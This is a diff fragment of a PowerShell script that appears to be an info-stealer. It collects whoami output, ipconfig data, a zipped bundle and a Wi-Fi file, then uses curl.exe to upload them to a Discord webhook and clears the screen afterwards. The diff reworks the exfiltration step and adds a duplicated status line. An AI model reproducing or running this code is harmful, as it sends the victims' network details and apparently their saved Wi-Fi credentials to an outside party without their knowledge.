@@ -43,21 +43,22 @@ Get-NetAdapter | ForEach-Object {
 ipconfig /all | Out-File "$e\ipcfg.txt"
 
 
-$mac  = (Get-NetAdapter).MacAddress
-$ipv4 = (Get-NetIPAddress -AddressFamily IPv4).IPAddress
-$ipv6 = (Get-NetIPAddress -AddressFamily IPv6).IPAddress
 
 # Send to discord
-$info    = "IPv4: $($ipv4 -join ',\n') \n\n| MACS: $($mac -join ',\n') \n\n| IPv6: $($ipv6 -join ',\n')"
-$content = "$($whoami_content) | $info | @everyone"
 
-Write-Output about to send to discord, file exists! $zip, $wifiFile, $e\ipcfg.txt
-curl.exe -F "content=$content" `
-         -F "file1=@$zip" `
-         -F "file2=@$wifiFile" `
-         -F "file3=@$e\ipcfg.txt" `
-         -F "file4=@netInfoFile.txt" `
-         $wh
+$content = "$($whoami_content) | @everyone"
+
+Write-Output "about to send to discord, file exists! $zip, $wifiFile, $e\ipcfg.txt, $netInfoFile"
+
+Write-Output "about to send to discord, file exists! $zip, $wifiFile, $e\ipcfg.txt, $netInfoFile"
+
+curl.exe -X POST $wh `
+    -F "content=$content" `
+    -F "file1=@$zip" `
+    -F "file2=@$wifiFile" `
+    -F "file3=@$e\ipcfg.txt" `
+    -F "file4=@$netInfoFile"
+
 Write-Output sent to discord
 # cleanup
 cls
